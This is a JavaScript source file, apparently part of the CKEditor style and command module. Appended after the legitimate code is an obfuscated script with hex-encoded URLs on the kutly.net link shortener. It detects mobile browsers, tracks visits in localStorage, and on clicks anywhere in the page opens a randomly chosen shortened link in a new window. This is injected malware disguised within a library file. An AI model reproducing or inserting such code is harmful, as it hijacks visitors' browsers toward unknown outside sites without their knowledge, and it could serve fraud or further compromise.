							 .replace( /([^\s;])$/, '$1;')
							 .replace( /,\s+/g, ',' ) // Trimming spaces after comma (e.g. font-family name)(#4107).
							 .toLowerCase();
	}

	function applyStyle( document, remove )
	{
		// Get all ranges from the selection.
		var selection = document.getSelection();
		var ranges = selection.getRanges();
		var func = remove ? this.removeFromRange : this.applyToRange;

		// Apply the style to the ranges.
		for ( var i = 0 ; i < ranges.length ; i++ )
			func.call( this, ranges[ i ] );

		// Select the ranges again.
		selection.selectRanges( ranges );
	}
})();

CKEDITOR.styleCommand = function( style )
{
	this.style = style;
};

CKEDITOR.styleCommand.prototype.exec = function( editor )
{
	editor.focus();

	var doc = editor.document;

	if ( doc )
	{
		if ( this.state == CKEDITOR.TRISTATE_OFF )
			this.style.apply( doc );
		else if ( this.state == CKEDITOR.TRISTATE_ON )
			this.style.remove( doc );
	}

	return !!doc;
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());